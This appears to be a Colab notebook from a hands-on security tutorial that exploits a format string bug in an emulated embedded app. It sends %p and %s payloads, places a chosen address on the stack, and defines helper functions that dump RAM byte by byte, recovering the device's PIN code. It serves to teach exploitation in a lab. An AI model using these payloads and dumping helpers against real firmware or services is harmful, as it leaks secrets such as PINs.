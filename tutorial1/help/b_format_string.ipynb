{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOKzX0VrarFoULYDTg87+Dc",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Jubicod/wsf/blob/main/tutorial1/help/b_format_string.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Exploiting the **format string** bug\n"
      ],
      "metadata": {
        "id": "N24s4yA7Hpa3"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "xfXHzKKYHUP9"
      },
      "outputs": [],
      "source": [
        "!git clone https://github.com/Jubicod/wsf.git\n",
        "%run wsf/tutorial1/install.ipynb"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Blackbox exploitation"
      ],
      "metadata": {
        "id": "5SoGUeGLH9or"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# let's observe the answer to a simple command\n",
        "app=App()\n",
        "app.send('U5555')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "jhu8DIPCHbMe",
        "outputId": "030338d1-14c5-4a7d-e8eb-45e296d9ce14"
      },
      "execution_count": 22,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "U5555\n",
            "\n",
            "ok\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "332"
            ]
          },
          "metadata": {},
          "execution_count": 22
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# we can see that the command name ('U5555') is printed back by the app\n",
        "# in fact anything we send is echoed\n",
        "app.send('hello')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "bf4zPv5mIPqB",
        "outputId": "8f6536a8-b90c-4bfb-9017-e2debd2e58a4"
      },
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "hello\n",
            "\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "89"
            ]
          },
          "metadata": {},
          "execution_count": 24
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# let's see if there is a format string bug\n",
        "app.send('%p')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "W8yhBNhEIjKa",
        "outputId": "f8d71306-79b5-440c-e31d-e5851da62570"
      },
      "execution_count": 25,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "0x20004fe0\n",
            "\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "70"
            ]
          },
          "metadata": {},
          "execution_count": 25
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# some value was printed instead of our command: this is a format string bug !\n",
        "# we can print a lot more\n",
        "app.send('%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "WYek_4dJIvS5",
        "outputId": "44f78d83-2d67-470a-ea5a-a2194370113b"
      },
      "execution_count": 26,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "0x20004fe0-0x2-0x0-0xff-0x0-0x0-0x0-0x0-0x8000267-0x20-0x252d7025\n",
            "\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n",
            "------CRASHED--------\n",
            "Invalid memory fetch (UC_ERR_FETCH_UNMAPPED)\n",
            "PC = 0x70252d70\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "239"
            ]
          },
          "metadata": {},
          "execution_count": 26
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# we can see content of registers and stack !\n",
        "# app printed values of R1, R2, R3, value at stack pointer address, value at stack pointer address + 4, ...\n",
        "# R1 and R2 seems to point to RAM, most other are numerical values.\n",
        "# we have a also a pointer to code (odd number starting with 0x08...). probably the function return address\n",
        "\n",
        "# note that the application is crashing at the end (buffer overflow ? we'll look into that in another help file)\n",
        "\n",
        "# this is giving a lot of already valuable informations. where RAM and code addresses are for instance\n",
        "# we can try to see contents at address in R1 using %s (print as ascii)\n",
        "app.reset()\n",
        "app.send('#%s#')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 192
        },
        "id": "FKSi5qDQJCGS",
        "outputId": "2c83b03b-f5d0-4e2a-e181-80b4caa0d27d"
      },
      "execution_count": 43,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "#\u0004#\n",
            "\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'\\x04'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 43
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# bad luck, R1 point to non ascii stuff\n",
        "app.get_answer().split('#')[1]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 35
        },
        "id": "J5yxaJenKBLI",
        "outputId": "22da2964-0733-44d4-8881-7d9d5ae7fb84"
      },
      "execution_count": 44,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'\\x04'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 44
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# all we could dump is the value 4\n",
        "\n",
        "# try with R2\n",
        "app.send('%p-%s-')"
      ],
      "metadata": {
        "id": "0eZVgGsObxIw"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# let's have a closer look at the last format string ouput\n",
        "app.reset()\n",
        "app.send('%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "4MllOpvkTR6v",
        "outputId": "3d7025b9-bc4b-40b8-c880-a4e1ad9c07cc"
      },
      "execution_count": 7,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "0x20004fe0-0x20000a28-0x0-0x0-0x0-0x0-0x20004fe0-0x20004fe4-0x8000267-0x20-0x252d7025\n",
            "\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n",
            "------CRASHED--------\n",
            "Invalid memory fetch (UC_ERR_FETCH_UNMAPPED)\n",
            "PC = 0x70252d70\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "422"
            ]
          },
          "metadata": {},
          "execution_count": 7
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(chr(0x25)+chr(0x70)+chr(0x2d)+chr(0x25))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "930vZCR9VxCs",
        "outputId": "97e7fbe5-f96f-44be-c6dc-19fecd582d95"
      },
      "execution_count": 12,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "%p-%\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# 0x252d7025 is \"p%-p\" ! we are seeing our own buffer !!!\n",
        "# let's try to control the value\n",
        "app.reset()\n",
        "app.send(0x41414141,'%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "hjYOZMjbW5AZ",
        "outputId": "26659d5d-b8da-4f5c-b403-7afd96becbfc"
      },
      "execution_count": 18,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "AAAA0x20004fe0-0x20000a28-0x0-0x0-0x0-0x0-0x20004fe0-0x20004fe4-0x8000267-0x24-0x41414141\n",
            "\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n",
            "------CRASHED--------\n",
            "Invalid memory fetch (UC_ERR_FETCH_UNMAPPED)\n",
            "PC = 0x252d7024\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "446"
            ]
          },
          "metadata": {},
          "execution_count": 18
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# we can see our own value here !!\n",
        "# can we dump code or ram this way ?\n",
        "# not so easy, can we cannot dump addresses with a zero bytes in it, otherwise it stops the format string\n",
        "# we need the address to be at the end\n",
        "# it takes a bit of trial an error, and a lot of %p, but finally we got it\n",
        "app.reset()\n",
        "app.send('%p%p%p%p%p%p%p%p%p%p%pp%p%p%p%p%p%p%p%p%p%p%p %p',0x41414141)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "FDsWEYesYNxE",
        "outputId": "f204c852-494e-433a-f550-7a4468684aad"
      },
      "execution_count": 55,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "0x20004fe00x20000a280x00x00x3c0x2000501f0x20004fe00x20004fe40x80002670x340x70257025p0x702570250x702570250x702570250x702570250x257070250x257025700x257025700x257025700x257025700x257025700x70252070 0x41414141AAAA\n",
            "\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n",
            "------CRASHED--------\n",
            "Invalid memory fetch (UC_ERR_FETCH_UNMAPPED)\n",
            "PC = 0x70257024\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "542"
            ]
          },
          "metadata": {},
          "execution_count": 55
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# it takes a bit of trial an error, and a lot of %p, but finally we got it\n",
        "app.reset()\n",
        "app.send('%p%p%p%p%p%p%p%p%p%p%pp%p%p%p%p%p%p%p%p%p%p%p %s',0x20000004)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "hbkX4gxLc2ey",
        "outputId": "55c77656-5b4f-49b1-f4eb-a02aab6ca31f"
      },
      "execution_count": 58,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ready...\n",
            "0x20004fe00x20000a280x00x00x340x200050170x20004fe00x20004fe40x80002670x340x70257025p0x702570250x702570250x702570250x702570250x257070250x257025700x257025700x257025700x257025700x257025700x73252070 \u0004\n",
            "\n",
            "Rx: read value at slot x. ex R2\n",
            "Wxvvv: write value vvv at slot x. ex W137 writes 37 into slot 1\n",
            "Ix: increment value in slot x\n",
            "Uyyyyyyyy: unlock slots. yyyyy is the password. ex U1234\n",
            "S: get status on slots\n",
            "error\n",
            "------CRASHED--------\n",
            "Invalid memory fetch (UC_ERR_FETCH_UNMAPPED)\n",
            "PC = 0x70257024\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "542"
            ]
          },
          "metadata": {},
          "execution_count": 58
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "def dump_addr(add):\n",
        "  app.reset()\n",
        "  app.send('%p%p%p%p%p%p%p%p%p%p%pp%p%p%p%p%p%p%p%p%p%p%p#%s',add)\n",
        "  a = app.get_answer()\n",
        "  i = a.find('#')\n",
        "  return ord(a[i+1])\n",
        "\n",
        "\n",
        "def dump_all(begin, size):\n",
        "  dump = {}\n",
        "  for add in range(begin, begin+size):\n",
        "    dump[add] = dump_addr(add)\n",
        "  return dump\n",
        "\n",
        "def dump_display(dump):\n",
        "  for add in dump:\n",
        "    print(hex(add),'=',hex(dump[add]))\n",
        "\n",
        "app.send('w0254') # write 0xfe in slot 0 to recognize it\n",
        "dump_all(0x20000000, 0x20)\n",
        "\n"
      ],
      "metadata": {
        "id": "n0nHDHDUebJL"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "dump_display(dump)\n",
        "# we just dumped the RAM !!!\n",
        "# including the PIN code (0x20000006 to 0x20000009)\n",
        "# and all non-null slots values (even addresses starting at 0x2000000a)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "muhLPjyDgmv-",
        "outputId": "859614f2-c8c7-48fb-cf28-2031aaba2b0b"
      },
      "execution_count": 18,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "0x20000000 = 0xa\n",
            "0x20000001 = 0x1\n",
            "0x20000002 = 0x2\n",
            "0x20000003 = 0x3\n",
            "0x20000004 = 0x1\n",
            "0x20000005 = 0xff\n",
            "0x20000006 = 0x32\n",
            "0x20000007 = 0x33\n",
            "0x20000008 = 0x30\n",
            "0x20000009 = 0x34\n",
            "0x2000000a = 0xfe\n",
            "0x2000000b = 0xb\n",
            "0x2000000c = 0x62\n",
            "0x2000000d = 0xb\n",
            "0x2000000e = 0x63\n",
            "0x2000000f = 0xb\n",
            "0x20000010 = 0x64\n",
            "0x20000011 = 0x9\n",
            "0x20000012 = 0x78\n",
            "0x20000013 = 0xd\n",
            "0x20000014 = 0x79\n",
            "0x20000015 = 0x3\n",
            "0x20000016 = 0x7a\n",
            "0x20000017 = 0x1\n",
            "0x20000018 = 0x18\n",
            "0x20000019 = 0x19\n",
            "0x2000001a = 0x1a\n",
            "0x2000001b = 0x1b\n",
            "0x2000001c = 0x1c\n",
            "0x2000001d = 0x1d\n",
            "0x2000001e = 0x1e\n",
            "0x2000001f = 0x1f\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# we can dump the start of the flash code too !!\n",
        "dump_display(dump_all(0x08000000, 0x20))"
      ],
      "metadata": {
        "id": "OZ5Jbq05hsfA"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}